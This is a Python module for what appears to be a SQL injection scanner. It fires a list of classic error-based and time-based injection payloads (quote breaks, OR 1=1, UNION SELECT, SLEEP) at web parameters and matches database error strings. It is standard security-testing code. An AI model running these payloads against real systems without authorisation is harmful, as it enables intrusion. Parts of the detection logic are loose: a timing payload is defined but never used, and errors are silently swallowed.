"""
WebProbe - SQL Injection Scanner
Tests GET/POST parameters with error-based and time-based payloads.
"""

import time
import threading
import requests
from utils.logger import get_logger

logger = get_logger(__name__)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; WebProbe/1.0)"
}

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\" OR \"1\"=\"1",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "' AND SLEEP(2)--",        # time-based marker
    "1; SELECT SLEEP(2)--",
]

# DB error signatures
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query(): query failed",
    "supplied argument is not a valid mysql",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "sqlite exception",
    "sqlstate",
    "syntax error",
]

TIME_PAYLOAD = "' AND SLEEP(3)--"
TIME_THRESHOLD = 2.5   # seconds


class SQLiScanner:
    def __init__(self, endpoints: list, threads: int = 10):
        self.endpoints = endpoints
        self.threads   = threads
        self.results   = []
        self.lock      = threading.Lock()

    def _test_endpoint(self, ep: dict):
        url    = ep["url"]
        method = ep.get("method", "GET").upper()
        params = ep.get("params", {})

        if not params:
            return

        for param in params:
            for payload in ERROR_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload

                try:
                    t0 = time.time()
                    if method == "POST":
                        r = requests.post(url, data=test_params, headers=HEADERS,
                                          timeout=10, verify=False, allow_redirects=False)
                    else:
                        r = requests.get(url, params=test_params, headers=HEADERS,
                                         timeout=10, verify=False, allow_redirects=False)
                    elapsed = time.time() - t0

                    body = r.text.lower()
                    # Error-based detection
                    for sig in ERROR_SIGNATURES:
                        if sig in body:
                            with self.lock:
                                self.results.append({
                                    "type":    "SQL Injection (Error-Based)",
                                    "url":     url,
                                    "method":  method,
                                    "param":   param,
                                    "payload": payload,
                                    "evidence":sig,
                                    "severity":"HIGH"
                                })
                            logger.warning(f"  [SQLi] {url} | param={param} | payload={payload!r}")
                            return  # one hit per param is enough

                    # Time-based detection
                    if "SLEEP" in payload and elapsed >= TIME_THRESHOLD:
                        with self.lock:
                            self.results.append({
                                "type":    "SQL Injection (Time-Based Blind)",
                                "url":     url,
                                "method":  method,
                                "param":   param,
                                "payload": payload,
                                "evidence":f"Response delayed {elapsed:.1f}s",
                                "severity":"HIGH"
                            })
                        logger.warning(f"  [SQLi-Blind] {url} | param={param} | delay={elapsed:.1f}s")
                        return

                except Exception:
                    pass

    def scan(self):
        threads = []
        for ep in self.endpoints:
            t = threading.Thread(target=self._test_endpoint, args=(ep,))
            threads.append(t)
            t.start()
            if len(threads) >= self.threads:
                for th in threads:
                    th.join()
                threads = []
        for th in threads:
            th.join()
        return self.results
